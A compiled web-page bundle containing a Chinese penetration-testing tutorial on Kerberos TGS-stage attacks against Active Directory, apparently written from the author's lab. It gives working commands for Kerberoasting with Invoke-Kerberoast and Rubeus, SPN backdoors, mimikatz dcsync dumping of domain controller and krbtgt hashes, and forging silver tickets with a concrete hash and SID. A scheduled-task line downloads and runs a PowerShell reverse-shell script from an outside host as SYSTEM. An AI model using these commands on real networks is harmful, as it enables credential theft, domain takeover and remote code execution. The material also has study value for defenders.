import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as e,a,o as n}from"./app-DS0ZCcmM.js";const t={};function l(h,s){return n(),e("div",null,s[0]||(s[0]=[a(`<h1 id="tgs-req-tgs-rep阶段攻击" tabindex="-1"><a class="header-anchor" href="#tgs-req-tgs-rep阶段攻击"><span>TGS_REQ&amp;TGS_REP阶段攻击</span></a></h1><h2 id="pass-the-ticket" tabindex="-1"><a class="header-anchor" href="#pass-the-ticket"><span>Pass The Ticket</span></a></h2><p>Kerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后。我们就可以用这个票据来作为下阶段的验证了。</p><p>这个问题会新开一篇文章来讲</p><h2 id="kerberosting" tabindex="-1"><a class="header-anchor" href="#kerberosting"><span>kerberosting</span></a></h2><p>和AS-REP Roasting很像，但是位于不同的阶段,爆破的位置也不同.AS_REP Roasting通过爆破最外层的enc_part来获取用户的明文。</p><p>TGS_REP里面ticket里的enc_part是使用服务的hash进行加密的，所以我们可以通过爆破获得服务的明文。</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/kerberosting.png" alt="kerberosting" tabindex="0" loading="lazy"><figcaption>kerberosting</figcaption></figure><p>我们需要爆破的是ticket中的enc_part,这里直接使用工具来提取enc_part</p><p>自动实现工具，不需要mimikatz,普通用户权限即可</p><p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921" target="_blank" rel="noopener noreferrer">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p><p>提取出高权限用户的ID</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Invoke-Kerberoast</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">AdminCount </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">OutputFormat Hashcat | Select hash | </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">ConvertTo-CSV</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">NoTypeInformation</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/ps.png" alt="ps" tabindex="0" loading="lazy"><figcaption>ps</figcaption></figure><p>我这里没有高权限的账户，只有一个hacker的服务账户</p><p>将得到的hash值丢去hashcat进行破解，有概率得到明文密码</p><p>同样的可以使用Rubeus进行抓取</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Rubeus.exe kerberoast</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="如何扩大攻击" tabindex="-1"><a class="header-anchor" href="#如何扩大攻击"><span>如何扩大攻击</span></a></h3><p>扩大攻击在于获取到高权限的SPN用户，注册一个SPN需要<code>Read servicePrincipalName</code> 和 <code>Write serverPrincipalName</code> 的权限，我们能够在域内查询到拥有这两个权限的服务账户并获取其权限，就能手动为高权限用户添加SPN，从而得到高权限用户的TGS票据用于爆破或建立后门</p><ul><li><p>后门利用</p><p>获取SPN权限后，为指定域用户添加一个SPN</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>setspn.exe -U -A VNC/DC.hack.com Administrator</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>这样在域内的任意一台机器上都能获得该SPN,并拿到TGS票据</p><p>删除SPN操作</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>setspn.exe -D VNC/DC.hack.com Administrator</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li></ul><p><strong>问：为什么不尝试获取krbtgt的明文</strong></p><p>krbtgt的密码是随机的</p><h2 id="白银票据" tabindex="-1"><a class="header-anchor" href="#白银票据"><span>白银票据</span></a></h2><p>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</p><p>多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</p><p>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过</p><p><strong>制作白银票据的条件</strong></p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">1.域名称</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2.域的SID值</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">3.域中的Server服务器账户的NTLM-Hash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">4.伪造的用户名，可以是任意用户名.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">5.目标服务器上面的kerberos服务</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>白银票据的服务列表</strong></p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">服务名称</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">                    同时需要的服务</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">WMI</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">                        HOST、RPCSS</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">PowerShell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Remoting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        HOST、HTTP</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">WinRM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">                    HOST、HTTP</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Scheduled</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Tasks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">            HOST</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Windows</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> File</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Share</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        CIFS</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">LDAP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">                    LDAP</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Windows</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Remote</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    RPCSS、LDAP、CIFS</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>利用流程</strong></p><p>1.获取服务hash , sid等信息</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>mimikatz.exe</span></span>
<span class="line"><span>privilege::debug</span></span>
<span class="line"><span>lsadump::dcsync /domain:hack.com /user:DC$</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里以域控举例，获取到域控的hash和sid</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ntlm:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 9bd77ae433b8d7d9b37c6bec828f3ef4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> S-1-5-21-754643614-3937478331-2139222398</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> #不需要末尾的用户标识</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>2.伪造白银票据</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">kerberos::golden</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /domain:hack.com</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /sid:S-1-5-21-754643614-3937478331-2139222398</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /target:DC.hack.com</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /service:cifs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /rc4:9bd77ae433b8d7d9b37c6bec828f3ef4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /user:silver</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /ptt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>参数说明</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>/domain：当前域名称</span></span>
<span class="line"><span>/sid：SID值，和金票一样取前面一部分</span></span>
<span class="line"><span>/target：目标主机，这里是DC.hack.com</span></span>
<span class="line"><span>/service：服务名称，这里需要访问共享文件，所以是cifs</span></span>
<span class="line"><span>/rc4：目标主机的HASH值</span></span>
<span class="line"><span>/user：伪造的用户名</span></span>
<span class="line"><span>/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/silver.png" alt="silver" tabindex="0" loading="lazy"><figcaption>silver</figcaption></figure><p>成功创建并导入，在当前主机上输入klist即可查看到让导入的票据</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/klist.png" alt="klist" tabindex="0" loading="lazy"><figcaption>klist</figcaption></figure><p>导入票据之后，就能够访问DC的共享文件夹，这是因为我们创建的时cifs服务的银票</p><h3 id="其他服务的白银票据" tabindex="-1"><a class="header-anchor" href="#其他服务的白银票据"><span>其他服务的白银票据</span></a></h3><p><strong>伪造WSMAN和HTTP的Silver Ticket进行powershell远程执行</strong></p><p>从Windows Server 2008开始，WinRM服务自动启动，但是不开启监听，使用<code>winrm quickconfig</code>进行配置后，将打开HTTP和HTTPS监听端口。</p><p>使用mimikatz生成两个服务的银票</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>kerberos::golden /domain:hack.com /sid:S-1-5-21-754643614-3937478331-2139222398 /target:DC.hack.com /service:wsman /rc4:9bd77ae433b8d7d9b37c6bec828f3ef4 /user:hacker /ptt</span></span>
<span class="line"><span>kerberos::golden /domain:hack.com /sid:S-1-5-21-754643614-3937478331-2139222398 /target:DC.hack.com /service:HTTP /rc4:9bd77ae433b8d7d9b37c6bec828f3ef4 /user:hacker /ptt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>注入两张<a href="https://adsecurity.org/?page_id=183" target="_blank" rel="noopener noreferrer">HTTP</a>＆<a href="https://adsecurity.org/?page_id=183" target="_blank" rel="noopener noreferrer">WSMAN</a>白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">New-PSSession</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> PSC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ComputerName</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> DC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Enter-PSSession</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> PSC</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>获取HOST服务权限创建计划任务</strong></p><p>创建HOST服务的银票</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>kerberos::golden /domain:hack.com /sid:S-1-5-21-754643614-3937478331-2139222398 /target:DC.hack.com /service:HOST /rc4:9bd77ae433b8d7d9b37c6bec828f3ef4 /user:hacker /ptt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>创建计划任务</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#Check you have permissions to use schtasks over a remote server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">schtasks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> some.vuln.pc</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#Create scheduled task, first for exe execution, second for powershell reverse shell download</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">schtasks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> some.vuln.pc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /SC</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> weekly</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /RU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;NT Authority\\System&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /TN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;SomeTaskName&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /TR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;C:\\path\\to\\executable.exe&quot;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">schtasks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> some.vuln.pc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /SC</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Weekly</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /RU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;NT Authority\\SYSTEM&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /TN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;SomeTaskName&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /TR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://172.16.100.114:8080/pc.ps1&#39;&#39;&#39;)&#39;&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#Check it was successfully created</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">schtasks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /query</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> some.vuln.pc</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#Run created schtask now</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">schtasks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /Run</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /S</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> mcorp-dc.moneycorp.local</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /TN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;SomeTaskName&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>伪造<code>ldap</code>的 Silver Ticket 访问目标计算机的LDAP 服务</strong></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>kerberos::golden /domain:0day.org /sid:S-1-5-21-754643614-3937478331-2139222398 /target:DC /rc4:9bd77ae433b8d7d9b37c6bec828f3ef4 /service:LDAP /user:administrator /ptt</span></span>
<span class="line"><span></span></span>
<span class="line"><span>lsadump::dcsync /dc:OWA2010SP3 /domain:hack.com /user:krbtgt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>HOST + RPCSS</strong></p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#Check you have enough privileges</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Invoke-WmiMethod</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -class</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> win32_operatingsystem</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ComputerName</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> remote.computer.local</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#Execute code</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Invoke-WmiMethod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> win32_process</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ComputerName</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $Computer</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -argumentlist</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$RunCommand</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#You can also use wmic</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wmic</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> remote.computer.local</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> full</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /format:list</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="委派攻击" tabindex="-1"><a class="header-anchor" href="#委派攻击"><span>委派攻击</span></a></h2><p>会开一篇新的详细讲</p>`,62)]))}const k=i(t,[["render",l],["__file","TGS_REQ_TGS_REP阶段攻击.html.vue"]]),d=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Kerberos%E4%B8%93%E9%A2%98/TGS_REQ_TGS_REP%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB.html","title":"TGS_REQ&TGS_REP阶段攻击","lang":"zh-CN","frontmatter":{"description":"TGS_REQ&TGS_REP阶段攻击 Pass The Ticket Kerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后。我们就可...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Kerberos%E4%B8%93%E9%A2%98/TGS_REQ_TGS_REP%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"TGS_REQ&TGS_REP阶段攻击"}],["meta",{"property":"og:description","content":"TGS_REQ&TGS_REP阶段攻击 Pass The Ticket Kerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后。我们就可..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/kerberosting.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"TGS_REQ&TGS_REP阶段攻击\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/kerberosting.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/ps.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/silver.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/ass/klist.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"Pass The Ticket","slug":"pass-the-ticket","link":"#pass-the-ticket","children":[]},{"level":2,"title":"kerberosting","slug":"kerberosting","link":"#kerberosting","children":[{"level":3,"title":"如何扩大攻击","slug":"如何扩大攻击","link":"#如何扩大攻击","children":[]}]},{"level":2,"title":"白银票据","slug":"白银票据","link":"#白银票据","children":[{"level":3,"title":"其他服务的白银票据","slug":"其他服务的白银票据","link":"#其他服务的白银票据","children":[]}]},{"level":2,"title":"委派攻击","slug":"委派攻击","link":"#委派攻击","children":[]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":4.82,"words":1445},"filePathRelative":"渗透测试/Kerberos专题/TGS_REQ&TGS_REP阶段攻击.md","localizedDate":"2025年1月16日","excerpt":"\\n<h2>Pass The Ticket</h2>\\n<p>Kerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后。我们就可以用这个票据来作为下阶段的验证了。</p>\\n<p>这个问题会新开一篇文章来讲</p>\\n<h2>kerberosting</h2>\\n<p>和AS-REP Roasting很像，但是位于不同的阶段,爆破的位置也不同.AS_REP Roasting通过爆破最外层的enc_part来获取用户的明文。</p>","autoDesc":true}');export{k as comp,d as data};
